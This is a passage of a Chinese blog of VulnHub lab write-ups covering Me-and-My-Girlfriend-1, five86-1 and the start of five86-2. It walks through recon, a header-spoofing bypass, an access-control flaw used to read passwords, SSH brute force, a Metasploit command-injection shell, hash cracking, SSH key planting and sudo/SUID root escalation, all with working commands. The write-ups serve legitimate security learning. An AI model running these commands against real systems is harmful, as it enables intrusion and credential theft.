id="me-and-my-girlfriend-1"><a class="markdownIt-Anchor" href="#me-and-my-girlfriend-1"></a> <a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">Me-and-My-Girlfriend-1</a></h1><p><code>2020/03/04 13:23:34</code></p><h2 id="端口扫描-8"><a class="markdownIt-Anchor" href="#端口扫描-8"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.164</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.164</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)</span><br><span class="line">|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)</span><br><span class="line">|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)</span><br><span class="line">|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:06:D9:59 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.002 days (since Wed Mar  4 00:21:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;256 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-8"><a class="markdownIt-Anchor" href="#web路径枚举-8"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.233/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.164&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;config&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;index.php (CODE:200|SIZE:120)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;misc&#x2F;                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;robots.txt (CODE:200|SIZE:32)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;server-status (CODE:403|SIZE:294)</span><br></pre></td></tr></table></figure><ul><li>访问<code>/</code>： <code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></li><li>访问<code>robots.txt</code>：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Allow: &#x2F;heyhoo.txt</span><br></pre></td></tr></table></figure><ul><li>访问<code>/heyhoo.txt</code>：<code>Great! What you need now is reconn, attack and got the shell</code></li></ul><h2 id="漏洞利用-8"><a class="markdownIt-Anchor" href="#漏洞利用-8"></a> 漏洞利用</h2><p>使用hackbar进行操作<br />添加HTTP Header: <code>X-Forwarded-For: 0.0.0.0</code><br />请求<code>/</code>之后发现页面无变化，而浏览器路径变成<code>/?page=index</code><br />再次请求<code>/?page=index</code>，则显示正常页面</p><blockquote><p>个人推测是仿造IP请求<code>/</code>之后，触发302跳转至<code>?page=index</code>，而跳转之后的请求进行伪造IP，所以需要进行两步操作。包括之后的请求都要先点击链接，导入hackbar，在hackbar中请求。</p></blockquote><p>在register页面中注册一个用户<br />随后login<br />这两步推荐在BurpSuite中操作<br />HTTP Header加上<code>X-Forwarded-For: 0.0.0.0</code>即可</p><p>成功登入之后路径为<code>/index.php?page=dashboard&amp;user_id=12</code><br />而进入profile之后可以在源码中查看当前用户名与密码</p><p>更改user_id参数，即可未授权访问其他用户的profile页面<br />将所获取的账户与密码写入文件，再添加两个常用词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">eweuhtandingan</span><br><span class="line">skuyatuh</span><br><span class="line">aingmaung</span><br><span class="line">qwerty!!!</span><br><span class="line">sundatea</span><br><span class="line">indONEsia</span><br><span class="line">sedihaingmah</span><br><span class="line">cedihhihihi</span><br><span class="line">alice</span><br><span class="line">4lic3</span><br><span class="line">abdikasepak</span><br><span class="line">dorrrrr</span><br><span class="line">admin</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>利用hydra对SSH服务进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L dic -P dic  -v -e ns ssh:&#x2F;&#x2F;192.168.31.164</span><br><span class="line">    [22][ssh] host: 192.168.31.164   login: alice   password: 4lic3</span><br></pre></td></tr></table></figure><p>成功获取账户</p><h2 id="权限提升-8"><a class="markdownIt-Anchor" href="#权限提升-8"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh alice@192.168.31.164</span><br><span class="line">    4lic3</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>用sudo权限使用php来进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo php -r &quot;system(&#39;&#x2F;bin&#x2F;bash&#39;);&quot;</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>密码共用</p></blockquote><p>值得一提的是，除了WEB服务中alice账户可以用于登入SSH服务之外，数据库的密码(<code>/var/www/html/config/config.php</code>)也是root用户的口令。进行靶机渗透时经常会出现这种状况，当获取到一些账户时，不妨试着在后台运行一下hydra。现实中这种情况也很常见，虽然理想状态下每个密码都足够复杂而且各不相同，但终将只是理想状态罢了。</p><blockquote><p>Mysql</p></blockquote><p>渗透过程中也尝试过针对user_id参数进行SQL注入，但是也没有进展，回过头想一下nmap扫描端口时并未发现Mysql服务。后来在网上看了一下，mysql可以设置为仅本地访问(localhost/127.0.0.1/0.0.0.0)。</p><blockquote><p>sudo</p></blockquote><p>之前对于<code>sudo</code>的理解还是不够透彻，仅仅单纯地以为sudo权限就是<code>sudo -i</code>直接提root，或者sudo接命令，片面地认为sudo权限是在账号层面上的。实则可以更为细化，如让账户可以以sudo权限执行某些命令。</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/ftl1012/p/sudo.html">sudo</a><br /><a href="http://www.freesion.com/article/4895226687/">wp</a><br /><a href="https://www.cnblogs.com/longyao/p/11719579.html">mysql</a></p></blockquote><hr /><h1 id="five86-1"><a class="markdownIt-Anchor" href="#five86-1"></a> <a href="https://www.vulnhub.com/entry/five86-1,417/">five86-1</a></h1><p><code>2020/03/08 18:20:27</code></p><h2 id="端口扫描-9"><a class="markdownIt-Anchor" href="#端口扫描-9"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.209</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;ona</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">10000&#x2F;tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 6E79CCAA5DCB1FD29C6A7C795BBD608E</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).</span><br><span class="line">MAC Address: 08:00:27:D8:1F:90 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 7.882 days (since Sat Feb 29 08:12:28 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-9"><a class="markdownIt-Anchor" href="#web路径枚举-9"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.209/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.209&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;index.html (CODE:200|SIZE:30)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;reports (CODE:401|SIZE:461)                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;robots.txt (CODE:200|SIZE:29)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><ul><li><code>/reports</code>路径需要进行basic认证</li><li>访问<code>/robots.txt</code>，得到如下内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;ona</span><br></pre></td></tr></table></figure><ul><li>路径<code>/ona</code>下运行的是&quot;opennetadmin v18.1.1&quot;</li><li>10000端口上的webmin服务需要账户</li></ul><h2 id="漏洞利用-9"><a class="markdownIt-Anchor" href="#漏洞利用-9"></a> 漏洞利用</h2><ul><li>opennetadmin存在RCE漏洞</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits&#x2F;php&#x2F;webapps&#x2F;26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits&#x2F;php&#x2F;webapps&#x2F;47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits&#x2F;php&#x2F;webapps&#x2F;47691.sh</span><br></pre></td></tr></table></figure><ul><li>webmin存在RCE漏洞但是需要提供账户</li></ul><p>在MSF中使用ona的RCE漏洞利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection</span><br><span class="line">set RHOST 192.168.31.209</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>获取shell</p><blockquote><p>当时MSF在kali源上的最新版本为5.0.76，而github上已更新到5.0.79，而且该RCE漏洞模块是在5.0.77版本加入MSF，所以需要手动将漏洞模块导入MSF，详情见下文</p></blockquote><h2 id="权限提升-9"><a class="markdownIt-Anchor" href="#权限提升-9"></a> 权限提升</h2><p>查看文件<code>/var/www/html/reports/.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;reports&#x2F;.htaccess</span><br><span class="line"></span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName &quot;Restricted Area&quot;</span><br><span class="line">AuthUserFile &#x2F;var&#x2F;www&#x2F;.htpasswd</span><br><span class="line">require valid-user</span><br></pre></td></tr></table></figure><p>查看文件<code>/var/www/.htpasswd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;.htpasswd </span><br><span class="line"></span><br><span class="line">douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1</span><br><span class="line"></span><br><span class="line"># To make things slightly less painful (a standard dictionary will likely fail),</span><br><span class="line"># use the following character set for this 10 character password: aefhrt</span><br></pre></td></tr></table></figure><p>得到账户douglas的密码hash与密码的相关信息</p><ul><li>由字符aefhrt组成</li><li>长度为十位</li></ul><p>将hash保存到本地<br /><code>echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' &gt; passwd</code></p><p>使用crunch构造字典<br /><code>crunch 10 10 aefhrt -o pass</code></p><p>使用john爆破hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;pass --format&#x3D;md5crypt passwd</span><br><span class="line">john --show passwd</span><br><span class="line">    douglas:fatherrrrr</span><br></pre></td></tr></table></figure><p>使用douglas账户登入目标主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh douglas:192.168.31.206</span><br><span class="line">fatherrrrr</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for douglas on five86-1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User douglas may run the following commands on five86-1:</span><br><span class="line">    (jen) NOPASSWD: &#x2F;bin&#x2F;cp</span><br></pre></td></tr></table></figure><p>可以以用户jen身份执行cp命令</p><p>生成ssh秘钥，拷贝至jen账户的home目录中，切换至账户jen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;jen@127.0.0.1&quot;</span><br><span class="line">cp &#x2F;home&#x2F;douglas&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;tmp&#x2F;authorized_keys</span><br><span class="line">sudo -u jen cp &#x2F;tmp&#x2F;authorized_keys &#x2F;home&#x2F;jen&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure><p>登入信息中得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have new mail.</span><br></pre></td></tr></table></figure><p>查看邮件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;mail&#x2F;jen</span><br><span class="line"></span><br><span class="line">From roy@five86-1 Wed Jan 01 03:17:00 2020</span><br><span class="line">Return-path: &lt;roy@five86-1&gt;</span><br><span class="line">Envelope-to: jen@five86-1</span><br><span class="line">Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">Received: from roy by five86-1 with local (Exim 4.92)</span><br><span class="line">(envelope-from &lt;roy@five86-1&gt;)</span><br><span class="line">id 1imZBc-0001FU-El</span><br><span class="line">for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">To: jen@five86-1</span><br><span class="line">Subject: Monday Moss</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;</span><br><span class="line">From: Roy Trenneman &lt;roy@five86-1&gt;</span><br><span class="line">Date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line"></span><br><span class="line">Hi Jen,</span><br><span class="line"></span><br><span class="line">As you know, I&#39;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.</span><br><span class="line"></span><br><span class="line">But anyway, I had to change Moss&#39;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!</span><br><span class="line"></span><br><span class="line">Moss will understand (ha ha ha ha).</span><br><span class="line"></span><br><span class="line">Tanks,</span><br><span class="line">Roy</span><br></pre></td></tr></table></figure><p>获得账户moss的密码</p><p>切换至账户moss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su moss</span><br><span class="line">Fire!Fire!</span><br></pre></td></tr></table></figure><p>在路径<code>/home/moss</code>下发现隐藏文件夹<code>.game</code><br />进入文件夹<code>.game</code>之后发现存在一个root权限的文件<code>upyourgame</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 2 moss moss  4096 Jan  1 03:53 .</span><br><span class="line">drwx------ 3 moss moss  4096 Jan  1 23:05 ..</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 battlestar -&gt; &#x2F;usr&#x2F;games&#x2F;battlestar</span><br><span class="line">lrwxrwxrwx 1 moss moss    14 Jan  1 03:23 bcd -&gt; &#x2F;usr&#x2F;games&#x2F;bcd</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 bombardier -&gt; &#x2F;usr&#x2F;games&#x2F;bombardier</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 empire -&gt; &#x2F;usr&#x2F;games&#x2F;empire</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:23 freesweep -&gt; &#x2F;usr&#x2F;games&#x2F;freesweep</span><br><span class="line">lrwxrwxrwx 1 moss moss    15 Jan  1 03:23 hunt -&gt; &#x2F;usr&#x2F;games&#x2F;hunt</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:22 ninvaders -&gt; &#x2F;usr&#x2F;games&#x2F;ninvaders</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:19 nsnake -&gt; &#x2F;usr&#x2F;games&#x2F;nsnake</span><br><span class="line">lrwxrwxrwx 1 moss moss    25 Jan  1 03:21 pacman4console -&gt; &#x2F;usr&#x2F;games&#x2F;pacman4console</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 petris -&gt; &#x2F;usr&#x2F;games&#x2F;petris</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 snake -&gt; &#x2F;usr&#x2F;games&#x2F;snake</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:20 sudoku -&gt; &#x2F;usr&#x2F;games&#x2F;sudoku</span><br><span class="line">-rwsr-xr-x 1 root root 16824 Jan  1 03:52 upyourgame</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 worms -&gt; &#x2F;usr&#x2F;games&#x2F;worms</span><br></pre></td></tr></table></figure><p>执行之后任意输入五次即可进入root权限下的sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;upyourgame </span><br><span class="line">Would you like to play a game? 1</span><br><span class="line"></span><br><span class="line">Could you please repeat that? 1</span><br><span class="line"></span><br><span class="line">Nope, you&#39;ll need to enter that again. 1</span><br><span class="line"></span><br><span class="line">You entered: No.  Is this correct? 1</span><br><span class="line"></span><br><span class="line">We appear to have a problem?  Do we have a problem? 1</span><br><span class="line"></span><br><span class="line">Made in Britain.</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1001(moss) groups&#x3D;1001(moss)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>手动导入MSF模块</p></blockquote><p>searchsploit命令找到了存储于本地的MSF漏洞利用模块，其路径为</p><p><code>/usr/share/exploitdb/exploits/linux/webapps/47772.rb</code></p><p>执行如下命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;webapps&#x2F;47772.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection.rb</span><br><span class="line">chmod 644 opennetadmin_ping_cmd_injection.rb.rb</span><br></pre></td></tr></table></figure><p>之后在MSF中执行<code>reload_all</code></p><blockquote><p>cp提权</p></blockquote><p>之前看到有文章大概列举了一下SUID提权的几个指令，其中有cp命令，但是没有文章没有列举出详细的操作过程<br />个人想法是用root权限的cp命令去覆盖掉passwd文件，这次靶机渗透学到了用cp命令去写入ssh信任秘钥来进行水平提权<br />大概不能将同样的套路用于垂直提权至root，因为一般ssh默认禁止掉了root登入</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/kuaile1314/p/12252563.html">WP</a></p></blockquote><hr /><h1 id="five86-2"><a class="markdownIt-Anchor" href="#five86-2"></a> <a href="https://www.vulnhub.com/entry/five86-2,418/">five86-2</a></h1><p><code>2020/03/15 21:54:23</code></p><h2 id="端口扫描-10"><a class="markdownIt-Anchor" href="#端口扫描-10"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.51</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">21&#x2F;tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80&#x2F;tcp open   ssl&#x2F;http Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;192.168.31.51&#x2F;</span><br><span class="line">MAC Address: 08:00:27:29:D0:EB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose|storage-misc|WAP|media device</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (95%), HP embedded (91%), Netgear RAIDiator 